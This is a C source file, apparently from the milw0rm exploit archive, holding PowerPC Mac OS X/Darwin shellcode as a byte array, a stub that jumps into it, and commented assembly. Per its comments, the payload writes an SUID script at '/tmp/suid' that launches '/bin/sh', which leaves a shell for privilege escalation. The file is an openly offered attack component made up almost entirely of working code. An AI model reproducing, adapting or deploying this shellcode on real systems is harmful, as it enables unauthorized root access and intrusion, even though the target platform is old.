/*
PPC OSX/Darwin Shellcode by B-r00t. 2003.
Does open(); write(); close(); exit();
See ASM below.
122 Bytes.
*/

char shellcode[] =
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
"\x7f\xe8\x02\xa6\x39\x1f\x01\x71"
"\x39\x08\xfe\xf4\x7c\xa8\x29\xae"
"\x38\x7f\x01\x68\x38\x63\xfe\xf4"
"\x38\x80\x02\x01\x38\xa0\xff\xff"
"\x39\x40\x01\x70\x38\x0a\xfe\x95"
"\x44\xff\xff\x02\x60\x60\x60\x60"
"\x38\x9f\x01\x72\x38\x84\xfe\xf4"
"\x38\xaa\xfe\x9c\x38\x0a\xfe\x94"
"\x44\xff\xff\x02\x60\x60\x60\x60"
"\x38\x0a\xfe\x96\x44\xff\xff\x02"
"\x60\x60\x60\x60\x38\x0a\xfe\x91"
"\x44\xff\xff\x02\x2f\x74\x6d\x70"
"\x2f\x73\x75\x69\x64\x58\x23\x21"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a"
"\x73\x68";

int main (void)
{
        __asm__("b _shellcode");
}

/*
; PPC OS X / Darwin Shellcode by B-r00t.
; open(); write(); close(); exit()
; Creates an SUID '/tmp/suid' to execute '/bin/sh'.
;
.globl _main
.text
_main:
        xor.    r5, r5, r5
        bnel    _main
        mflr    r31
        addi    r8, r31, 268+92+9
        addi    r8, r8, -268
        stbx    r5, r8, r5
        addi    r3, r31, 268+92
        addi    r3, r3, -268
        li      r4, 513
        li      r5, -1
        li      r10, 368
        addi    r0, r10, -363
        .long   0x44ffff02
        .long   0x60606060
        addi    r4, r31, 268+92+10
        addi    r4, r4, -268
        addi    r5, r10, -356
        addi    r0, r10, -364
        .long   0x44ffff02
        .long   0x60606060
        addi    r0, r10, -362
        .long   0x44ffff02
        .long   0x60606060
        addi    r0, r10, -367
        .long   0x44ffff02
path:   .asciz  "/tmp/suidX#!/bin/sh\nsh"

*/

// milw0rm.com [2004-09-26]